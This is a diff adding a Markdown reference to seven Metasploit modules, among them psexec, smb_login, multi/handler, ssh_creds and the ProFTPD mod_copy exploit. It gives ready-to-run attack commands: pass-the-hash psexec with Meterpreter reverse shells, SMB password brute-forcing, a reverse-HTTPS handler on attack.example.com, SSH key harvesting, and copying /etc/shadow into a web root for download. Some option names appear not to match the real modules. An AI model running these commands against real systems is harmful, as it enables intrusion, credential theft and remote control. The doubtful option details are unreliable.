@@ -1,0 +1,459 @@
+Metasploit Module Documentation Reference
+==========================================
+
+This document provides comprehensive documentation for common Metasploit Framework
+modules used in penetration testing and security assessment operations. Each module
+description covers the module name, synopsis, description, available options, usage
+examples, and relevant references.
+
+---
+
+## Module: exploit/windows/smb/psexec
+
+### Description
+
+The PsExec module exploits the Windows SMB service by uploading a payload to the
+ADMIN$ share on a target system and then executing it via the PsExec protocol. This
+module works by authenticating to the target system using valid credentials, uploading
+an executable payload to the ADMIN$ share, and then using the PsExec service to execute
+that payload remotely. This is one of the most reliable methods for obtaining a session
+on a Windows target when valid credentials are available.
+
+The module supports both PASS_THE_HASH and traditional credential authentication. When
+using PASS_THE_HASH, you supply an NTLM hash directly instead of a plaintext password,
+which avoids the need to crack hashes first. The module creates a service on the remote
+system that runs the payload, making it a persistent and reliable execution method.
+
+### Options
+
+- **RHOSTS** (required): Target host or range of hosts. Supports CIDR notation,
+  comma-separated lists, and RFQDN ranges.
+- **SMBDomain**: Windows domain for authentication. Defaults to the local workgroup.
+- **SMBUser**: Username for authentication. Must have administrative privileges on
+  the target system.
+- **SMBPass**: Password for authentication. Can be a plaintext password or an NTLM
+  hash in LM:NT format for pass-the-hash attacks.
+- **SMBPort**: Port for SMB communication. Defaults to 445 but can be set to 139 for
+  older systems.
+- **SERVICE_NAME**: Custom name for the created Windows service. Defaults to a random
+  alphanumeric string to avoid detection.
+- **SHARE**: The share to upload the payload to. Defaults to ADMIN$ but can be set
+  to C$ if ADMIN$ is not accessible.
+- **EXE::Custom**: Path to a custom executable to upload instead of the default
+  Metasploit payload.
+- **EXE::Path**: Path on the target system where the executable will be placed.
+  Defaults to a temp directory.
+
+### Usage Examples
+
+Basic usage with plaintext credentials:
+```
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass Password123!
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit
+```
+
+Pass-the-hash authentication:
+```
+use exploit/windows/smb/psexec
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 192.168.1.50
+exploit
+```
+
+### References
+
+- PsExec v2.2: https://download.sysinternals.com/files/PSTools.zip
+- MITRE ATT&CK T1570: Lateral Tool Transfer
+- MITRE ATT&CK T1021.002: Remote Services: SMB/Windows Admin Shares
+- CVE references: This module does not target a specific CVE
+
+---
+
+## Module: auxiliary/scanner/portscan/tcp
+
+### Description
+
+The TCP port scanner module performs a basic TCP connect scan against a target host
+or range of hosts. Unlike SYN scanning which requires raw socket privileges, TCP connect
+scanning completes the full three-way handshake, making it detectable by the target but
+reliable across all platforms including those where raw sockets are restricted. This
+module is ideal for initial reconnaissance when you need to quickly identify open ports
+on a target network.
+
+The scanner supports concurrent threading for fast scanning of large networks and
+provides detailed output including service banners where available. It integrates
+with the Metasploit database for result storage and subsequent exploitation. The
+module uses Ruby socket operations to establish full TCP connections, which means
+successful connections are logged by the target system, making this a noisy but
+dependable scanning approach.
+
+### Options
+
+- **RHOSTS** (required): Target host range. Supports CIDR, comma-separated, and
+  range notation (e.g., 192.168.1.1-254).
+- **PORTS**: Comma-separated list or range of ports to scan. Defaults to common
+  ports 1-1024 if not specified.
+- **THREADS**: Number of concurrent scanning threads. Defaults to 1, increase for
+  faster scanning on large networks. Recommended 10-50 for LAN, 5-10 for WAN.
+- **TIMEOUT**: Connection timeout in seconds per port. Defaults to 10 seconds.
+  Reduce for faster scanning on reliable networks.
+- **CONCURRENCY**: Maximum number of simultaneous connections. Defaults to match
+  the THREADS value.
+- **SHOW_BANNERS**: Set to true to capture service banners on open ports. Defaults
+  to false for performance.
+
+### Usage Examples
+
+Quick scan of common ports:
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.168.1.0/24
+set PORTS 22,80,443,445,3389,8080
+set THREADS 50
+run
+```
+
+Full port scan with banner grabbing:
+```
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 10.0.0.1-254
+set PORTS 1-65535
+set THREADS 100
+set TIMEOUT 5
+set SHOW_BANNERS true
+run
+```
+
+### References
+
+- Nmap Documentation: https://nmap.org/book/man-port-scanning-techniques.html
+- MITRE ATT&CK T1046: Network Service Discovery
+- TCP RFC 793: https://tools.ietf.org/html/rfc793
+
+---
+
+## Module: auxiliary/scanner/smb/smb_login
+
+### Description
+
+The SMB Login scanner module attempts to authenticate to Windows SMB services using
+provided credential lists. This is an essential post-reconnaissance tool for identifying
+valid accounts on a Windows network. The module supports authentication against both
+SMBv1 and SMBv2/v3 protocols and can test single credentials or load large credential
+files for brute-force testing. It reports successful logins including the privilege
+level of the authenticated account.
+
+The module is designed for both offensive and defensive use. Penetration testers use
+it to validate discovered credentials and identify administrative accounts. Security
+teams use it to audit password policies and find weak credentials. The module includes
+anti-lockout protection, pausing after configurable failed attempt thresholds to avoid
+account lockout policies. It also supports testing credentials against domain controllers
+for domain-level privilege escalation.
+
+### Options
+
+- **RHOSTS** (required): Target host range for SMB authentication testing.
+- **SMBDomain**: Domain name for authentication. Leave blank for local accounts.
+- **SMBUser**: Single username to test. Mutually exclusive with USER_FILE.
+- **SMBPass**: Single password to test. Mutually exclusive with PASS_FILE.
+- **USER_FILE**: Path to a file containing usernames (one per line) for brute-force.
+- **PASS_FILE**: Path to a file containing passwords (one per line) for brute-force.
+- **STOP_ON_SUCCESS**: Stop testing after first successful login. Defaults to false.
+- **BRUTEFORCE_SPEED**: Speed level from 0-5. Higher values mean more concurrent
+  attempts but higher risk of detection and lockout.
+- **DB_ALL_CREDENTIALS**: Use all credentials stored in the Metasploit database.
+- **ABORT_ON_LOCKOUT**: Stop if account lockout is detected. Defaults to true.
+- **MaxMinutes**: Maximum time in minutes to spend on brute-force testing.
+
+### Usage Examples
+
+Single credential test:
+```
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.100
+set SMBUser administrator
+set SMBPass Password123!
+run
+```
+
+Brute-force with credential files:
+```
+use auxiliary/scanner/smb/smb_login
+set RHOSTS 192.168.1.0/24
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/usernames.txt
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/passwords.txt
+set BRUTEFORCE_SPEED 3
+set STOP_ON_SUCCESS true
+run
+```
+
+### References
+
+- SMB Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/
+- MITRE ATT&CK T1110.001: Brute Force: Password Guessing
+- MITRE ATT&CK T1110.003: Brute Force: Password Cracking
+- SMB Security Guide: https://www.samba.org/samba/docs/server_security.html
+
+---
+
+## Module: exploit/multi/handler
+
+### Description
+
+The Multi Handler module is Metasploit's generic payload handler. It listens for
+incoming connections from payloads that have already been deployed on target systems.
+This is the most commonly used module in Metasploit because it serves as the receiver
+for reverse-connect payloads. When a target system executes a payload configured for
+reverse connection, the payload connects back to the handler which then establishes
+the session.
+
+The module supports all Metasploit payload types including Meterpreter, shell, VNC,
+and custom payloads. The handler can manage multiple simultaneous sessions, making it
+possible to catch connections from multiple targets. It supports both TCP and HTTPS
+transport protocols and can be configured with various evasion techniques including
+certificate verification bypass and HTTP/HTTPS proxying.
+
+For staging payloads, the handler serves the second-stage payload when the stager
+connects. This allows the initial payload to be very small (a stager) while the full
+Meterpreter payload is only downloaded after the connection is established. The module
+also supports payload migration, where the active session can be moved from the initial
+process to a more stable process on the target system.
+
+### Options
+
+- **PAYLOAD** (required): The payload type to handle. Common choices include
+  windows/x64/meterpreter/reverse_tcp, linux/x64/meterpreter/reverse_tcp,
+  and java/jshell_reverse_tcp.
+- **LHOST** (required for reverse payloads): The local IP address or interface to
+  listen on for incoming connections.
+- **LPORT**: The local port to listen on. Defaults to 4444.
+- **ExitOnSession**: Whether to exit after receiving a session. Defaults to false
+  for multi-session handling.
+- **ListenerTimeout**: Timeout in seconds for the listener. 0 means listen forever.
+- **StagerRetryWait**: Seconds between stager connection retries.
+- **ReverseListenerComm**: Communication channel for reverse connections.
+
+### Usage Examples
+
+Basic Meterpreter handler:
+```
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 4444
+exploit -j
+```
+
+HTTPS handler with certificate:
+```
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST attack.example.com
+set LPORT 443
+set HandlerSSLCert /path/to/cert.pem
+set StagerVerifySSLCert true
+exploit -j
+```
+
+Multi-session handler:
+```
+use exploit/multi/handler
+set PAYLOAD linux/x64/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+set LPORT 5555
+set ExitOnSession false
+exploit -j -z
+```
+
+### References
+
+- Meterpreter Basics: https://docs.metasploit.com/docs/using-metasploit/basics/
+- MITRE ATT&CK T1571: Non-Standard Port
+- MITRE ATT&CK T1573.001: Encrypted Channel: Symmetric Cryptography
+- Payload Reference: https://docs.metasploit.com/docs/using-metasploit/basics/metasploit-payloads/
+
+---
+
+## Module: post/multi/gather/ssh_creds
+
+### Description
+
+The SSH Credentials Gatherer is a post-exploitation module that collects SSH keys and
+configuration data from compromised systems. Once a session is established on a target,
+this module searches common SSH directories for private keys, authorized_keys files,
+known_hosts, and SSH client configurations. The module supports extraction from Linux,
+macOS, and Windows (WSL) targets, making it versatile for multi-platform engagements.
+
+The module identifies SSH keys in standard locations such as /home/*/.ssh/,
+/root/.ssh/, and /etc/ssh/. For each discovered key, it extracts the key type,
+bit length, fingerprint, and file path. Discovered keys are stored in the Metasploit
+database for later use in lateral movement. The module also collects SSH agent
+information and any forwarding configurations that could enable pivoting through
+the compromised host.
+
+Key extraction is performed by reading files directly from disk, which means the
+session must have sufficient file read permissions. For Windows targets with WSL,
+the module searches the WSL filesystem mounted under the standard WSL paths. The
+module also checks for SSH keys stored in password managers and cloud credential
+stores when accessible.
+
+### Options
+
+- **SESSION** (required): The session ID of the compromised target to collect from.
+- **STORE_LOOT**: Whether to store collected keys as loot in the database. Defaults
+  to true, which preserves keys for later use.
+- **DUMP_SSH_CONFIG**: Whether to parse and dump SSH client configuration files.
+  Defaults to true.
+- **EXTRACT_AGENT_KEYS**: Whether to check for keys loaded in SSH agents. Defaults
+  to true but requires agent forwarding or socket access.
+- **ALL_USERS**: Search home directories of all users, not just the current session
+  user. Defaults to true. Requires root/admin privileges for other users' directories.
+
+### Usage Examples
+
+Gather SSH keys from a session:
+```
+use post/multi/gather/ssh_creds
+set SESSION 1
+set ALL_USERS true
+run
+```
+
+Quick extraction from current user only:
+```
+use post/multi/gather/ssh_creds
+set SESSION 1
+set ALL_USERS false
+set EXTRACT_AGENT_KEYS false
+run
+```
+
+### References
+
+- SSH Protocol: https://www.ssh.com/academy/ssh/protocol
+- MITRE ATT&CK T1552.004: Unsecured Credentials: Private Keys
+- MITRE ATT&CK T1078: Valid Accounts
+- OpenSSH Manual: https://man.openbsd.org/ssh
+
+---
+
+## Module: exploit/unix/ftp/proftpd_modcopy
+
+### Description
+
+The ProFTPD mod_copy module exploits a vulnerability in the mod_copy module of
+ProFTPD server versions 1.3.5 and earlier. The mod_copy module implements the SITE
+CPFR and SITE CPTO commands, which allow remote users to copy files on the server
+without authentication. An attacker can leverage this to copy sensitive files such
+as /etc/shadow or the ProFTPD configuration to a world-readable location, or to copy
+a PHP webshell into a web-accessible directory for remote code execution.
+
+The vulnerability exists because the mod_copy module does not enforce any
+authentication requirements before allowing file copy operations. The SITE CPFR
+command sets the source file path, and the SITE CPTO command sets the destination.
+The module chains these commands to place a PHP payload in the web root, then
+triggers the payload via an HTTP request to achieve remote code execution. This
+technique is highly reliable against vulnerable servers and leaves minimal forensic
+artifacts if the payload files are cleaned up after exploitation.
+
+### Options
+
+- **RHOSTS** (required): Target ProFTPD server address or range.
+- **RPORT**: FTP port. Defaults to 21.
+- **TARGETURI**: Base URI path for the web server. Defaults to /.
+- **WEBSERVER**: Whether the target runs a web server (required for RCE). Defaults
+  to true.
+- **SITEPATH**: Path to the web root on the target filesystem. Defaults to
+  /var/www/html/ for Apache on Debian-based systems.
+- **PAYLOAD**: The payload to deliver. Recommended: cmd/unix/reverse for Unix targets.
+
+### Usage Examples
+
+Exploit ProFTPD with reverse shell:
+```
+use exploit/unix/ftp/proftpd_modcopy
+set RHOSTS 192.168.1.50
+set PAYLOAD cmd/unix/reverse
+set LHOST 192.168.1.100
+exploit
+```
+
+Copy /etc/shadow for offline cracking:
+```
+use exploit/unix/ftp/proftpd_modcopy
+set RHOSTS 192.168.1.50
+# Manually connect via FTP:
+# SITE CPFR /etc/shadow
+# SITE CPTO /var/www/html/shadow.txt
+# Then wget http://192.168.1.50/shadow.txt
+```
+
+### References
+
+- CVE-2015-3306: ProFTPD mod_copy vulnerability
+- ProFTPD mod_copy: https://www.proftpd.org/docs/contrib/mod_copy.html
+- MITRE ATT&CK T1190: Exploit Public-Facing Application
+- MITRE ATT&CK T1083: File and Directory Discovery
+
+---
+
+## Module: auxiliary/scanner/http/http_version
+
+### Description
+
+The HTTP Version scanner probes web servers to identify their software version,
+running services, and common web application frameworks. It sends crafted HTTP
+requests and analyzes the response headers, body content, and behavior to fingerprint
+the server technology stack. The module identifies web servers (Apache, Nginx, IIS),
+application frameworks (PHP, ASP.NET, Django, Flask), content management systems
+(WordPress, Drupal, Joomla), and other web technologies.
+
+The scanner is a non-intrusive reconnaissance tool that uses standard HTTP requests,
+making it difficult to detect as malicious. It analyzes Server headers, X-Powered-By
+headers, Set-Cookie patterns, and response body fingerprints. The module can also
+detect default installations, common misconfigurations, and exposed admin interfaces.
+Results are stored in the Metasploit database and can be used to select appropriate
+exploit modules for identified services.
+
+### Options
+
+- **RHOSTS** (required): Target host range. Supports CIDR and range notation.
+- **RPORT**: Target port. Defaults to 80.
+- **SSL**: Use HTTPS. Defaults to false.
+- **THREADS**: Number of concurrent threads. Defaults to 1.
+- **SHOW_BANNERS**: Include response headers in output. Defaults to true.
+- **HTTP_METHOD**: HTTP method to use for probing. Defaults to GET.
+- **VHOST**: Virtual host header to use. Useful for name-based virtual hosting.
+
+### Usage Examples
+
+Scan a single host:
+```
+use auxiliary/scanner/http/http_version
+set RHOSTS 192.168.1.100
+run
+```
+
+Scan a network with SSL:
+```
+use auxiliary/scanner/http/http_version
+set RHOSTS 10.0.0.0/24
+set RPORT 443
+set SSL true
+set THREADS 25
+run
+```
+
+### References
+
+- HTTP/1.1 RFC 7231: https://tools.ietf.org/html/rfc7231
+- MITRE ATT&CK T1018: Remote System Discovery
+- Web Server Fingerprinting: https://owasp.org/www-community/
